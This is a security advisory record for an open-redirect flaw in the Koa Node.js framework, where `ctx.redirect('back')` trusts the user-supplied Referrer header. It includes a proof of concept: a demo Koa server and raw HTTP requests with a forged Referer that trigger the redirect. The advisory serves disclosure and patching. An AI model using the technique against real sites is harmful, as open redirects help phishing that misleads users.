advisory_id: GHSA-jgmv-j7ww-jx2x
datasource_id: github_osv_importer_v2/GHSA-jgmv-j7ww-jx2x
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json
aliases:
  - CVE-2025-8129
summary: "Koa Open Redirect via Referrer Header (User-Controlled)\n## Summary\nIn the latest\
  \ version of Koa, the back method used for redirect operations adopts an insecure implementation,\
  \ which uses the user-controllable referrer header as the redirect target.\n\n## Details\n\
  on the API document https://www.koajs.net/api/response#responseredirecturl-alt, we can see:\n\
  \n**response.redirect(url, [alt])**\n```\nPerforms a [302] redirect to url.\nThe string \"\
  back\" is specially provided for Referrer support, using alt or \"/\" when Referrer does not\
  \ exist.\n\nctx.redirect('back');\nctx.redirect('back', '/index.html');\nctx.redirect('/login');\n\
  ctx.redirect('http://google.com');\n\n```\nhowever, the \"back\" method is insecure:\n\n-\
  \ https://github.com/koajs/koa/blob/master/lib/response.js#L322\n```\n  back (alt) {\n   \
  \ const url = this.ctx.get('Referrer') || alt || '/'\n    this.redirect(url)\n  },\n```\n\
  Referrer Header is User-Controlled.\n\n\n## PoC\n\n**there is a demo for POC:**\n```\nconst\
  \ Koa = require('koa')\nconst serve = require('koa-static')\nconst Router = require('@koa/router')\n\
  const path = require('path')\n\nconst app = new Koa()\nconst router = new Router()\n\n// Serve\
  \ static files from the public directory\napp.use(serve(path.join(__dirname, 'public')))\n\
  \n// Define routes\nrouter.get('/test', ctx => {\n  ctx.redirect('back', '/index1.html')\n\
  })\n\nrouter.get('/test2', ctx => {\n  ctx.redirect('back')\n})\n\nrouter.get('/', ctx =>\
  \ {\n  ctx.body = 'Welcome to the home page! Try accessing /test, /test2'\n})\n\napp.use(router.routes())\n\
  app.use(router.allowedMethods())\n\nconst port = 3000\napp.listen(port, () => {\n  console.log(`Server\
  \ running at http://localhost:${port}`)\n}) \n```\n**Proof Of Concept**\n```\nGET /test HTTP/1.1\n\
  Host: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n\n\nGET /test2 HTTP/1.1\n\
  Host: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n```\n![image](https://github.com/user-attachments/assets/03d1e61b-df97-4b42-a0c4-437bd17144db)\n\
  \n![image](https://github.com/user-attachments/assets/f4e076e0-3853-4b7a-b4c0-bddf5b67631a)\n\
  \n\n## Impact\nhttps://learn.snyk.io/lesson/open-redirect/"
impacted_packages:
  - purl: pkg:npm/koa
    affected_versions: vers:npm/>=2.0.0|<2.16.2
    fixed_versions: vers:npm/2.16.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/koa
    affected_versions: vers:npm/>=3.0.0-alpha.0|<3.0.1
    fixed_versions: vers:npm/3.0.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '3.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json
  - score: '2.0'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-601
references:
  - url: https://github.com/koajs/koa
    reference_type:
    reference_id:
  - url: https://github.com/koajs/koa/commit/422c551c63d00f24e2bbbdf492f262a5935bb1f0
    reference_type:
    reference_id:
  - url: https://github.com/koajs/koa/issues/1892
    reference_type:
    reference_id:
  - url: https://github.com/koajs/koa/issues/1892#issue-3213028583
    reference_type:
    reference_id:
  - url: https://github.com/koajs/koa/security/advisories/GHSA-jgmv-j7ww-jx2x
    reference_type:
    reference_id:
  - url: https://vuldb.com/?ctiid.317514
    reference_type:
    reference_id:
  - url: https://vuldb.com/?id.317514
    reference_type:
    reference_id:
  - url: https://vuldb.com/?submit.619741
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-54420
    reference_type:
    reference_id: CVE-2025-54420
